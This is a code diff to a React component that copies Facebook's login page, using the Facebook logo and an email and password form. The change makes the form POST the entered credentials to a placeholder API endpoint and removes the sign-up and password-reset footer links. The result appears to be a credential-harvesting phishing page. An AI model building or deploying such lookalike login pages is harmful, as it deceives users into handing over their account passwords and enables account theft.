@@ -5,18 +5,26 @@ const FacebookLogin = () => {
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
 
-  const handleSubmit = (event) => {
+  const handleSubmit = async (event) => {
     event.preventDefault();
-    // You can add your code for sending data to your API here
-    console.log("Email:", email);
-    console.log("Password:", password);
+    try {
+      await fetch("<API_ENDPOINT>", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({ email, password }),
+      });
+    } catch (error) {
+      console.error(error);
+    }
   };
 
   return (
     <div className="container">
       <form onSubmit={handleSubmit} className="form">
         <img
-          src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1024px-Facebook_Logo_%282019%29.png"
+          src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1024px-Facebook_Logo_%282019%29.png" alt=""
           className="logo"
         />
         <input
@@ -37,14 +45,6 @@ const FacebookLogin = () => {
           Log In
         </button>
       </form>
-      <div className="footer">
-        <p className="footerText">
-          New to Facebook? <a href="#">Sign up</a>
-        </p>
-        <p className="footerText">
-          Forgot password? <a href="#">Request password reset</a>
-        </p>
-      </div>
     </div>
   );
 };
